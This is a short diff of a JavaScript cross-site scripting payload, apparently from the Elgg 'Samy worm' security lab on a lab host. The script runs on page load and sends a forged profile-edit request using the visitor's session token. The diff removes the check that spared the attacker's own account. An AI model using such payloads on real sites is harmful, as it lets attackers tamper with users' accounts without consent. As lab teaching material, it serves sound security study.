@@ -11,8 +11,7 @@ window.onload = function(){
     var content=token + ts + name+ "&briefdescription=ILoveSamy" + guid;
     // Send the HTTP POST request
     var samyGuid=59;
-    if (elgg.session.user.guid!=samyGuid)       // (1)
-    {
+ 
         // Create and send Ajax request to modify profile
         var Ajax=null;
         Ajax=new XMLHttpRequest();
@@ -20,6 +19,6 @@ window.onload = function(){
         Ajax.setRequestHeader("Host","www.xsslabelgg.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax.send(content);
-    }
+    
 }
 </script>
